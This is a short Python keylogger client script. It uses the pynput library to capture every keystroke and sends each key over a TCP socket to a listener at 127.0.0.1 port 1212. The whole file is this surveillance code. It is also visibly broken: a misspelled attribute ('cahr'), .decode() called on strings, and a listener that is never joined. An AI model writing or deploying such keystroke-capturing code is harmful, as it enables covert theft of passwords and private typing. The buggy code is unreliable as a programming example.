"""clinet code"""
import socket
from pynput import keyboard

ip = "127.0.0.1"
port = 1212

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

def MyPrint(key):
    argkey = str(key)
    if len(argkey) == 3:
        text = argkey.cahr
        s.send(text.decode())
    else:
        text = " "
        s.send(text.decode())
        

listen = keyboard.Listener(MyPrint)
listen.start()


